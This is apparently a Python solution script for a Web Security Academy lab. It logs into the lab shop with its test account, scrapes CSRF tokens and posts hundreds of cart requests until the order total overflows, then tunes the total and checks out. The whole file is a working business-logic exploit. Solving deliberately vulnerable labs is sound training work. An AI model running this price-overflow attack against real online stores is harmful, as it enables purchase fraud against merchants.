import requests
import re
from bs4 import BeautifulSoup

URL = "https://ac881fa91eacf067c05e9a3400e40050.web-security-academy.net"
proxies = {
	"http" : "http://127.0.0.1:8080",
    "https" : "https://127.0.0.1:8080",
}

def getCsrf(text):
    soup = BeautifulSoup(text, 'html.parser')
    csrfToken = soup.find('input',attrs = {'name':'csrf'})['value']
    print(f"[+] CSRF Token: {csrfToken}")
    return csrfToken


# To intercept requesst in burp, export the following:
     # export REQUESTS_CA_BUNDLE="/path/to/pem/encoded/cert"
     # export REQUESTS_CA_BUNDLE="/home/vlaghe/proj/sec/burp_labs/burp.pem"
     # export HTTP_PROXY="http://127.0.0.1:8080"
     # export HTTPS_PROXY="http://127.0.0.1:8080"
 
# Session setup
s = requests.Session()
s.proxies = proxies


# Login
r = s.get(URL+"/login")
login_data = {
    "csrf": getCsrf(r.text),
    "username": "wiener",
    "password": "peter"
}
s.post(URL+"/login", data=login_data)

# Retrieve csrf token
r = s.get(URL+"/login")
login_data['csrf'] = getCsrf(r.text)

# Add items to cart until integer overflow
data = {
    "productId": "1",
    "redir": "PRODUCT",
    "quantity": "99"
}

# 161 req @ $21442806.00 -- integer overflow
# will finish @ a balance of $64060
price = 0
for i in range(0, 324):
    s.post(URL+"/cart", data=data)
    r = s.get(URL+"/cart")
    prev_price = price
    price = re.findall(r"\$([0-9,]*\.[0-9]*)", r.text)[2]
    if (float(price) < float(prev_price) ):
        print(f"[+] Integer overflow reached: {price}\t{prev_price}")
    else:
        print(f"{i}\t{price}")

# send another 44 lether jackets (64060 / 1337 = 47)
data['quantity'] = "47"
s.post(URL+"/cart", data=data)
r = s.get(URL+"/cart")
price = re.findall(r"\$([0-9,]*\.[0-9]*)", r.text)[2]
print(f"ordering another 44 lether jackets\t{price}")
 
# we're left off with $1221 so order another item 
# until we're left with a price ranging between 0-100
# NOTE: you might need to change the quantity & productId
data['quantity'] = "19"
data['productId'] = "4"
s.post(URL+"/cart", data=data)
r = s.get(URL+"/cart")
price = re.findall(r"\$([0-9,]*\.[0-9]*)", r.text)
print(f"ordering 17 grasshoppers\t{price}")

# Place order
r = s.post(URL+"/cart/checkout", data={"csrf": login_data['csrf']})
print(r.text)
